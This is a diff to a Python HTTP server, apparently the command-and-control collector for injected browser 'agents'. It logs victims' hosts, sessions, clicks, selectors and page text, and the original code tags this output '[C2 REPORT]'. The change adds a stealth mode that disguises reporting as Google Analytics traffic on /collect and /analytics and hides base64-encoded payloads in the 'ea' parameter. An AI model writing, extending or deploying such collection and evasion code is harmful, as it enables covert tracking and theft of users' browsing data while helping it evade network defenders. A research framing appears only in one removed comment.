@@ -134,8 +134,11 @@ class ScannerHandler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def do_POST(self):
-        if self.path.startswith('/report'):
-            # Handle activity reporting from agents
+        # Handle both direct and mimicked (stealth) reporting
+        is_stealth = self.path.startswith('/collect') or self.path.startswith('/analytics')
+        is_direct = self.path.startswith('/report')
+
+        if is_stealth or is_direct:
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
             
@@ -147,13 +150,24 @@ class ScannerHandler(BaseHTTPRequestHandler):
             host = params.get('host', ['Unknown'])[0]
             event = params.get('event', ['heartbeat'])[0]
             
+            # Handle Stealth Mimicry Params (e.g., Google Analytics format)
+            if is_stealth:
+                sid = params.get('cid', [sid])[0] # Client ID
+                host = params.get('dl', [host])[0] # Document Location
+                event = params.get('ec', [event])[0] # Event Category
+            
             try:
-                data = json.loads(post_data) if post_data else {}
-            except:
-                data = {}
+                # If stealth, data might be base64 encoded in a param or body
+                if is_stealth and 'ea' in params: # Event Action contains payload
+                    import base64
+                    encoded_data = params.get('ea')[0]
+                    data = json.loads(base64.b64decode(encoded_data).decode('utf-8'))
+                else:
+                    data = json.loads(post_data) if post_data else {}
+            except Exception as e:
+                data = {"raw": post_data}
 
             if sid:
-                # Update existing session or create new one
                 session = MONITORED_SESSIONS.get(sid, {
                     "sid": sid,
                     "host": host,
@@ -166,15 +180,15 @@ class ScannerHandler(BaseHTTPRequestHandler):
                 session["last_time_str"] = datetime.now().strftime("%H:%M:%S")
                 session["last_event"] = event
                 session["events"] += 1
+                session["is_stealth"] = is_stealth
                 
-                # Keep a short log of the last 5 events
                 session["log"].append({"time": session["last_time_str"], "event": event})
                 session["log"] = session["log"][-5:]
                 
                 MONITORED_SESSIONS[sid] = session
                 
-                # Log activity to console for research visibility
-                print(f"[C2 REPORT] {session['last_time_str']} | Host: {host} | SID: {sid} | Event: {event} (#{session['events']})")
+                mode_tag = "[STEALTH]" if is_stealth else "[DIRECT]"
+                print(f"{mode_tag} {session['last_time_str']} | Host: {host} | SID: {sid} | Event: {event} (#{session['events']})")
                 if data:
                     if event == 'click':
                         print(f"   - Clicked: {data.get('tag')} | Selector: {data.get('selector')} | Text: '{data.get('text')}'")
@@ -192,7 +206,7 @@ class ScannerHandler(BaseHTTPRequestHandler):
             self.send_header('Access-Control-Allow-Origin', '*')
             self.send_header('Content-Type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({"status": "captured"}).encode())
+            self.wfile.write(json.dumps({"status": "captured", "stealth": is_stealth}).encode())
         else:
             self.send_response(404)
             self.end_headers()
